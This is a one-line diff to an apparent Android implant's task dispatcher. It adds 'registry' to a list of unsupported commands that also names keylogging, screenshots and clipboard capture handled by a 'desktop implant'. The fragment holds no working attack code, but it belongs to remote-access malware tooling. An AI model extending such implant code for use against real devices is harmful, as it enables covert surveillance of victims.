@@ -253,6 +253,7 @@ object TaskRunner {
             "session.close" -> unsupported("session.close", "an interactive session needs the desktop implant")
             "keylog" -> unsupported("keylog", "android has no global keyboard hook")
             "keylog.file" -> unsupported("keylog.file", "android has no global keyboard hook")
+            "registry" -> unsupported("registry", "android has no windows registry")
             "screenshot" -> unsupported("screenshot", "the screen capture needs a desktop implant")
             "clipboard" -> unsupported("clipboard", "the clipboard needs a desktop implant")
 
